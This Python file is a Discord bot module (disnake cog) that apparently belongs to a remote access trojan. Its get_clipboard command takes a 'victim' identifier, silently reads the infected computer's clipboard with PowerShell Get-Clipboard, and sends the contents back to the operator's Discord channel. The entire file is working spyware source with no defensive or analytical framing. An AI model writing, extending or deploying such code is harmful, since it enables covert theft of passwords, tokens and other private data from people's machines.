from disnake.ext import commands
from datetime import datetime

import os


class GetClipboard(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @commands.slash_command()
    async def get_clipboard(self, ctx, victim):
        """Sends current text stored in user clipboard

        Parameters
        ----------
        victim: Identifier of the affected computer (found via /listvictims).
        """
        if self.bot.valid(victim):
            await ctx.response.defer()

            outp = os.popen("powershell Get-Clipboard").read()
            if len(outp) > 1000:
                return await ctx.followup.send(f"```{outp}```")

            embed = self.bot.genEmbed(
                "Clipboard contents",
                datetime.now(),
                f"```{outp}```" if outp != "" else "No text in clipboard",
            )

            await ctx.followup.send(embed=embed)


def setup(bot: commands.Bot):
    bot.add_cog(GetClipboard(bot))
